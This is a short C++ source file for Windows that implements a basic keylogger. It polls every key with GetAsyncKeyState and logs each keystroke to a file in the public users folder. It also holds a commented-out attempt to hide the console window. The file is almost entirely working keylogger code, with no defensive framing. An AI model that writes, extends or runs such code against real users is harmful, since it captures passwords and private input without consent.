#define _CRT_SECURE_NO_WARNINGS

#include <iostream>
#include <Windows.h>
#include <string>
//https://learn.microsoft.com/en-us/windows/win32/inputdev/virtual-key-codes
int main()
{
	FILE* fp;
	fp = fopen("c:\\users\\public\\klogging.log", "w+");

	/*
    The below doesn't work on Windows Terminal

	HWND myhandle;
	myhandle = GetConsoleWindow();
	ShowWindow(myhandle, SW_HIDE);

	*/
	while (true) {
		for (int key = 8; key <= 190; key++) {
			const auto state = GetAsyncKeyState(key);
			if (state == -32767) {
				//char keyBuffer[4];
				//snprintf(keyBuffer, 4, "%s", std::to_string(key));

				printf("key pressed: %c | %x\n", key, key);
				fprintf(fp, "key pressed: %c | %x\n", key, key);
			}
		}
	}
	fclose(fp);
}

